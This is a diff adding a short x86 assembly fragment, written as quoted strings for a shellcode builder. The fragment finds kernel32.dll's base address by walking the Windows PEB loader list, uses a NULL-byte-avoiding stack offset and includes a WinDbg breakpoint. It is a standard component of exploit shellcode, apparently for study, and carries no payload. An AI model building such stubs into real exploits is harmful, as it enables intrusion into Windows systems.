@@ -1,0 +1,18 @@
+" start:                             "   #   Demo purpose to locate base addr of kernel32.dll
+"   int3                            ;"   #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+"   mov ebp, esp                    ;"   #
+"   add esp, 0xfffff9f0             ;"   #   Avoid NULL bytes by using 0xfffff9f0
+
+" find_kernel32:                     "   #
+"   xor   edi, edi                   ;"  #   EDI = 0
+"   mov   esi, fs:[edi+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
+"   mov   esi, [esi+0Ch]             ;"  #   ESI = PEB->Ldr
+"   mov   esi, [esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder
+
+" next_module:                       "  #
+"   mov ebx, [esi+8h]               ;"  #   EBX = InInitOrder[X].base_address
+"   mov edi, [esi+20h]              ;"  #   EDI = InInitOrder[X].module_name
+"   mov esi, [esi]                  ;"  #   ESI = InInitOrder[X].flink (next)
+"   cmp [edi+12*2], cx              ;"  #   (unicode) modulename[12] == 0x00 ?
+"   jne next_module                 ;"  #   No: try next module. # Cmp the 12 characters of kernel32.dll
+"   ret                             ;"  #   Stop looping when KERNEL32.dll has been located r ebx, du EDI
